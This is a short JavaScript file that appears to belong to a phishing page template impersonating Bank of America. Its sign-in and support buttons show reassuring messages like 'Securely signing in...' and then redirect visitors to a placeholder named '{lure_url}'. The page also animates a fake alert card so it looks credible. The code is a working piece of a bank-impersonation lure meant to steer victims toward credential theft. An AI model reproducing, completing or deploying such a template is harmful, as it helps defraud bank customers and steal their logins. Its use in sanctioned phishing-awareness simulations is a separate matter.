function signInBOFA() {
    const btn = document.querySelector('.btn-bofa-primary');
    btn.innerHTML = '<span>Securely signing in...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 2000);
}

function contactSupport() {
    const btn = document.querySelector('.btn-bofa-secondary');
    btn.innerHTML = '<span>Connecting...</span>';
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.alert-card');
    card.style.opacity = '0';
    card.style.transform = 'translateY(30px)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
    }, 200);
    
    const icon = document.querySelector('.alert-icon svg');
    icon.style.animation = 'pulse 2s infinite';
});
